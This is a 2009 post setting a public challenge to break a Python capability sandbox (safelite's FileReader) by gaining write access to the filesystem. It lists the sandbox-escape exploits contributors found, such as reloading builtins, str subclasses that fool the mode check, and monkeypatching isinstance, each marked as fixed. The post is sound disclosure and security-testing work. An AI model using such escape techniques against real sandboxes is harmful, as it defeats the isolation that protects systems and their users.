====================================
A Challenge To Break Python Security
====================================

:X-Created: [2009-02-23, 22:12]

The challenge is simple:

* Open a fresh Python interpreter and do:

    >>> from safelite import FileReader

* You can use ``FileReader`` to read files on your filesystem

* Now find a way to *write* to the filesystem from your interpreter

You can find the latest version of safelite.py here:

* http://release.plexnet.org/misc/cappython/safelite.py [VERSION 5]

I will keep safelite.py updated as new exploits and workarounds are found until
we hopefully end up with a version we can be confident about. [VERSION attribute
added on Steven D'Aprano's recommendation.]

If enough smart hackers look at this and it holds up, `Guido
<http://twitter.com/gvanrossum>`_ promises to accept a patch which would enable
this function-based approach to security on both App Engine and future Python
versions.

So, please try the challenge and let me know how you find it in the comments.
Thanks!

Note: The aim of this isn't to protect Python against crashes/segfaults or
exhaustion of resources attacks, so those don't count.

Good luck and thanks! =)


**Exploits Found & Fixed So Far:**

* `Victor Stinner <http://www.haypocalc.com/wiki/Victor_Stinner>`_ and `Tim
  Wintle
  <http://mail.python.org/pipermail/python-list/2009-February/530536.html>`_
  found the first exploit: 

    >>> reload(__builtins__)
    <module '__builtin__' (built-in)> 

    >>> open('0wn3d', 'w').write('w00t\n')

  [Fixed in v2]

* `Guido van Rossum <http://twitter.com/gvanrossum>`_ and `Mark Eichin
  <http://twitter.com/eichin>`_ came up with this devious:

    >>> class S(str):
    ...     def __eq__(self, o): return 'r' == o

    >>> f = FileReader('w00t', S('w'))

    >>> f.close() # creates an empty file called 'w00t'

  [Fixed in v5]

* clsn took it further and bypassed the fix in v4:

    >>> class S(str):
    ...     def __eq__(self, o): return 'r' == o
    ...     def __str__(self): return self

* Mike Rooney started messing with the assumptions of builtins being
  unaltered:

    >>> __builtins__.str = S

  [Fixed in v5]

* Farshid Lashkari then took it to a whole new elegant level:

    >>> _real_file = None

    >>> def _new_isinstance(obj,types):
    ...     global _real_file
    ...     if _real_file is None and obj.__class__.__name__ == 'file':
    ...         _real_file = obj.__class__
    ...     return _old_isinstance(obj,types)

    >>> __builtins__.isinstance = _new_isinstance
    >>> FileReader('nul')

    >>> f = _real_file('foo.txt', 'w')

  [Fixed in v5]
